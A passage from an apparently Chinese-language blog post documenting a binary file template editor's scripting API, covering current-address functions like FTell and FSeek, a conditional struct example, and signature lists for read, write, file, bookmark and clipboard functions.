myData;</span><br></pre></td></tr></table></figure><h2 id="当前地址"><a href="#当前地址" class="headerlink" title="当前地址"></a>当前地址</h2><p>当前地址是下一个被定义变量的起始地址，初始为 0h，每定义一个变量，当前地址将会后移该变量的大小（通常用十六进制表示）</p><p>FTell() 函数用于获取当前地址，FSeek() 函数用于修改当前地址，FSkip() 函数用于移动当前地址，使用这些函数的组合<br>可以实现不按序读取数据。</p><p>使用 ReadInt()、ReadByte() 等读取函数配合 FTell() 等函数可以从当前地址开始读取一段符合类型的值,这几个函数不会影响当前地址，常在条件语句中<br>用作判断，例如：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从当前地址开始读取一段 int 值，且这个值为 1 时，将会定义结构体变量 opt1，类型为 OPTION1</span></span><br><span class="line"><span class="comment">// 否则将会定义结构体变量 opt2，类型为 OPTION2</span></span><br><span class="line"><span class="keyword">struct</span> <span class="type">OPTION1</span> &#123; int tag; uchar data[<span class="number">8</span>]; &#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="type">OPTION2</span> &#123; int tag; uint64 data; &#125;;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">ReadInt</span>( <span class="built_in">FTell</span>() ) == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">struct</span> <span class="type">OPTION1</span> opt1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="type">OPTION2</span> opt2;</span><br></pre></td></tr></table></figure><h2 id="常用api"><a href="#常用api" class="headerlink" title="常用api"></a>常用api</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void <span class="constructor">BigEndian()</span></span><br><span class="line">void <span class="constructor">LittleEndian()</span></span><br><span class="line"><span class="built_in">char</span> <span class="constructor">ReadByte(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">uchar <span class="constructor">ReadUByte(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">short <span class="constructor">ReadShort(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">ushort <span class="constructor">ReadUShort(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadInt(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">uint <span class="constructor">ReadUInt(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">ReadInt64(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">uint64 <span class="constructor">ReadUInt64(<span class="params">int64</span> <span class="params">pos</span>=FTell()</span>)</span><br><span class="line">void <span class="constructor">ReadBytes(<span class="params">uchar</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">n</span>)</span></span><br><span class="line"><span class="built_in">char</span><span class="literal">[]</span> <span class="constructor">ReadString(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadStringLength(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line">wstring <span class="constructor">ReadWString(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadWStringLength(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1)</span></span><br><span class="line">void <span class="constructor">WriteByte(<span class="params">int64</span> <span class="params">pos</span>, <span class="params">char</span> <span class="params">value</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSeek(<span class="params">int64</span> <span class="params">pos</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSkip(<span class="params">int64</span> <span class="params">offset</span>)</span></span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">FTell()</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FEof()</span></span><br><span class="line">void <span class="constructor">Strcpy(<span class="params">char</span> <span class="params">dest</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">src</span>[])</span></span><br><span class="line">void <span class="constructor">Strcat(<span class="params">char</span> <span class="params">dest</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">src</span>[])</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Strchr(<span class="params">const</span> <span class="params">char</span> <span class="params">s</span>[], <span class="params">char</span> <span class="params">c</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Strcmp(<span class="params">const</span> <span class="params">char</span> <span class="params">s1</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">s2</span>[])</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Printf(<span class="params">const</span> <span class="params">char</span> <span class="params">format</span>[] [, <span class="params">argument</span>, <span class="operator">...</span> ])</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">SScanf(<span class="params">char</span> <span class="params">str</span>[], <span class="params">char</span> <span class="params">format</span>[], <span class="operator">...</span>)</span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">SPrintf(<span class="params">char</span> <span class="params">buffer</span>[], <span class="params">const</span> <span class="params">char</span> <span class="params">format</span>[] [, <span class="params">argument</span>, <span class="operator">...</span> ])</span></span><br></pre></td></tr></table></figure><p>io函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"> void <span class="constructor">BigEndian()</span><span class="comment">//设置大小头端  </span></span><br><span class="line"><span class="built_in">int</span> <span class="constructor">IsBigEndian()</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">IsLittleEndian()</span>  </span><br><span class="line">void <span class="constructor">LittleEndian()</span>  </span><br><span class="line">  </span><br><span class="line">double <span class="constructor">ConvertBytesToDouble( <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span> <span class="comment">//数据转换  </span></span><br><span class="line"><span class="built_in">float</span> <span class="constructor">ConvertBytesToFloat( <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span>   </span><br><span class="line">hfloat <span class="constructor">ConvertBytesToHFloat( <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ConvertDataToBytes( <span class="params">data_type</span> <span class="params">value</span>, <span class="params">uchar</span> <span class="params">byteArray</span>[] )</span>  </span><br><span class="line">void <span class="constructor">DeleteBytes( <span class="params">int64</span> <span class="params">start</span>, <span class="params">int64</span> <span class="params">size</span> )</span><span class="comment">//删除数据  </span></span><br><span class="line">void <span class="constructor">InsertBytes( <span class="params">int64</span> <span class="params">start</span>, <span class="params">int64</span> <span class="params">size</span>, <span class="params">uchar</span> <span class="params">value</span>=0 )</span><span class="comment">//插入数据  </span></span><br><span class="line">void <span class="constructor">OverwriteBytes( <span class="params">int64</span> <span class="params">start</span>, <span class="params">int64</span> <span class="params">size</span>, <span class="params">uchar</span> <span class="params">value</span>=0 )</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">char</span> <span class="constructor">ReadByte( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> ) <span class="comment">//读取数据  </span></span><br><span class="line">double <span class="constructor">ReadDouble( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">float</span> <span class="constructor">ReadFloat( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">hfloat <span class="constructor">ReadHFloat( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadInt( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">ReadInt64( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">ReadQuad( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">short <span class="constructor">ReadShort( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )  </span><br><span class="line">uchar <span class="constructor">ReadUByte( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">uint <span class="constructor">ReadUInt( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">uint64 <span class="constructor">ReadUInt64( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">uint64 <span class="constructor">ReadUQuad( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )   </span><br><span class="line">ushort <span class="constructor">ReadUShort( <span class="params">int64</span> <span class="params">pos</span>=FTell()</span> )  </span><br><span class="line">void <span class="constructor">ReadBytes( <span class="params">uchar</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">n</span> )</span>  </span><br><span class="line"><span class="built_in">char</span><span class="literal">[]</span> <span class="constructor">ReadString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadStringLength( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line">wstring <span class="constructor">ReadWString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">ReadWStringLength( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line">wstring <span class="constructor">ReadWLine( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1 )</span>  </span><br><span class="line"><span class="built_in">char</span><span class="literal">[]</span> <span class="constructor">ReadLine( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">maxLen</span>=-1, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line">  </span><br><span class="line">void <span class="constructor">WriteByte( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">char</span> <span class="params">value</span> )</span> <span class="comment">//写入数据  </span></span><br><span class="line">void <span class="constructor">WriteDouble( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">double</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteFloat( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">float</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteHFloat( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">float</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteInt( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteInt64( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteQuad( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteShort( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">short</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUByte( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uchar</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUInt( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uint</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUInt64( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uint64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUQuad( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">uint64</span> <span class="params">value</span> )</span>   </span><br><span class="line">void <span class="constructor">WriteUShort( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">ushort</span> <span class="params">value</span> )</span>  </span><br><span class="line">void <span class="constructor">WriteBytes( <span class="params">const</span> <span class="params">uchar</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">pos</span>, <span class="params">int</span> <span class="params">n</span> )</span>  </span><br><span class="line">void <span class="constructor">WriteString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">const</span> <span class="params">char</span> <span class="params">value</span>[] )</span>  </span><br><span class="line">void <span class="constructor">WriteWString( <span class="params">int64</span> <span class="params">pos</span>, <span class="params">const</span> <span class="params">wstring</span> <span class="params">value</span> )</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">DirectoryExists( <span class="params">string</span> <span class="params">dir</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">MakeDir( <span class="params">string</span> <span class="params">dir</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FEof()</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">FileSize()</span>  </span><br><span class="line">TFileList <span class="constructor">FindFiles( <span class="params">string</span> <span class="params">dir</span>, <span class="params">string</span> <span class="params">filter</span> )</span>  </span><br><span class="line">    TFileList fl = <span class="constructor">FindFiles( <span class="string">"C:\\temp\\"</span>, <span class="string">"*.zip"</span> )</span>;  </span><br><span class="line">    <span class="built_in">int</span> i;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">"Num files = %d\n"</span>, <span class="params">fl</span>.<span class="params">filecount</span> )</span>;  </span><br><span class="line">    for( i = <span class="number">0</span>; i &lt; fl.filecount; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">" %s\n"</span>, <span class="params">fl</span>.<span class="params">file</span>[<span class="params">i</span>].<span class="params">filename</span> )</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">"\n"</span> )</span>;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">"Num dirs = %d\n"</span>, <span class="params">fl</span>.<span class="params">dircount</span> )</span>;  </span><br><span class="line">    for( i = <span class="number">0</span>; i &lt; fl.dircount; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">    <span class="constructor">Printf( <span class="string">" %s\n"</span>, <span class="params">fl</span>.<span class="params">dir</span>[<span class="params">i</span>].<span class="params">dirname</span> )</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FPrintf( <span class="params">int</span> <span class="params">fileNum</span>, <span class="params">char</span> <span class="params">format</span>[], <span class="operator">...</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSeek( <span class="params">int64</span> <span class="params">pos</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">FSkip( <span class="params">int64</span> <span class="params">offset</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">FTell()</span>  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextAddressToLine( <span class="params">int64</span> <span class="params">address</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextAddressToColumn( <span class="params">int64</span> <span class="params">address</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextColumnToAddress( <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">column</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextGetNumLines()</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextGetLineSize( <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line"><span class="built_in">int64</span> <span class="constructor">TextLineToAddress( <span class="params">int64</span> <span class="params">line</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextReadLine( <span class="params">char</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">maxsize</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line"><span class="built_in">int</span> <span class="constructor">TextReadLineW( <span class="params">wchar_t</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">maxsize</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line">void <span class="constructor">TextWriteLineW( <span class="params">const</span> <span class="params">wchar_t</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span>  </span><br><span class="line">void <span class="constructor">TextWriteLine( <span class="params">const</span> <span class="params">char</span> <span class="params">buffer</span>[], <span class="params">int64</span> <span class="params">line</span>, <span class="params">int</span> <span class="params">includeLinefeeds</span>=<span class="params">true</span> )</span></span><br></pre></td></tr></table></figure><p>其他函数</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//书签  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddBookmark</span>(<span class="params"> int64 pos, <span class="keyword">string</span> name, <span class="keyword">string</span> typename, <span class="keyword">int</span> arraySize=<span class="number">-1</span>, <span class="keyword">int</span> forecolor=cNone, <span class="keyword">int</span> backcolor=<span class="number">0xffffc4</span>, <span class="keyword">int</span> moveWithCursor=<span class="literal">false</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="title">AddBookmark</span>(<span class="params"> GetCursorPos(</span>), "endmarker","ZIPENDLOCATOR", -1, cRed )</span>;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkArraySize</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkBackColor</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkForeColor</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBookmarkMoveWithCursor</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetBookmarkName</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetBookmarkPos</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetBookmarkType</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetNumBookmarks</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RemoveBookmark</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function"><span class="comment">//断言  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Assert</span>(<span class="params"> <span class="keyword">int</span> <span class="keyword">value</span>, <span class="keyword">const</span> <span class="keyword">char</span> msg[] = <span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="title">Assert</span>(<span class="params"> numRecords &gt; <span class="number">10</span>,<span class="string">"numRecords should be more than 10."</span> </span>)</span>;  </span><br><span class="line"><span class="comment">//剪贴板  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyBytesToClipboard</span>(<span class="params"> uchar buffer[], <span class="keyword">int</span> size, <span class="keyword">int</span> charset=CHARSET_ANSI, <span class="keyword">int</span> bigendian=<span class="literal">false</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyStringToClipboard</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> charset=CHARSET_ANSI </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyToClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CutToClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetClipboardBytes</span>(<span class="params"> uchar buffer[], <span class="keyword">int</span> maxBytes </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetClipboardIndex</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetClipboardString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PasteFromClipboard</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetClipboardIndex</span>(<span class="params"> <span class="keyword">int</span> index </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">文件  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DeleteFile</span>(<span class="params"> <span class="keyword">char</span> filename[] </span>)    <span class="comment">//删除文件，文件不能在编辑器中打开  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FileClose</span>(<span class="params"></span>)<span class="comment">//关闭当前文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileCount</span>(<span class="params"></span>)<span class="comment">//获取editor打开的文件数  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileExists</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)<span class="comment">//检测文件存在  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileNew</span>(<span class="params"> <span class="keyword">char</span> <span class="keyword">interface</span>[]=<span class="string">""</span>, <span class="keyword">int</span> makeActive=<span class="literal">true</span> </span>)<span class="comment">//创建爱你文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileOpen</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[], <span class="keyword">int</span> runTemplate=<span class="literal">false</span>, <span class="keyword">char</span> <span class="keyword">interface</span>[]=<span class="string">""</span>, <span class="keyword">int</span> openDuplicate=<span class="literal">false</span> </span>)<span class="comment">//打开文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSave</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSave</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSave</span>(<span class="params"> <span class="keyword">const</span> wchar_t filename[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSaveRange</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[], int64 start, int64 size </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FileSaveRange</span>(<span class="params"> <span class="keyword">const</span> wchar_t filename[], int64 start, int64 size </span>)<span class="comment">//保存文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FileSelect</span>(<span class="params"> <span class="keyword">int</span> index </span>)<span class="comment">//选择读写的文件  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FindOpenFile</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> path[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FindOpenFileW</span>(<span class="params"> <span class="keyword">const</span> wchar_t path[] </span>)<span class="comment">//查找并打开文件 